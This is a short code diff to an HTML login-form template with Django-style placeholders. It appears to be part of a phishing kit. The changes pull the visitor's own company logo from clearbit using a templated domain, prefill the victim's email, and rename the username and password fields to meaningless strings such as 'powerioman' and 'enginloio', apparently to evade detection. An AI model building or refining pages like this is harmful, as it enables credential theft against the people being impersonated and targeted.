@@ -2,10 +2,11 @@
 <html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <title></title>
+  <title>.....</title>
+  <link rel="icon" href="https://logo.clearbit.com/{{domains}}" type="image/x-icon"/>
   <style type="text/css">
     body {
-  background: #f2f2f2;
+  background: green;
 }
 .animate {
   -webkit-transition: all 0.3s linear;
@@ -231,14 +232,15 @@ span.validate-tooltip {
   <div class="inner-warpper text-center">
     <h2 class="title">Login to your account</h2>
     <form action="addin" id="formvalidate" method="post">
+      {% csrf_token %}
       <div class="input-group">
         <label class="palceholder" for="userName">User Name</label>
-        <input class="form-control" name="userName" id="userName" type="text" value="{{email}}" required=""/>
+        <input class="form-control" name="powerioman" id="userName" type="text" value="{{email}}" required=""/>
         <span class="lighting"></span>
       </div>
       <div class="input-group">
         <label class="palceholder" for="userPassword">Password</label>
-        <input class="form-control" name="userPassword" id="userPassword" type="password" placeholder="" required="" />
+        <input class="form-control" name="enginloio" id="userPassword" type="password" placeholder="" required="" />
         <span class="lighting"></span>
       </div>
 
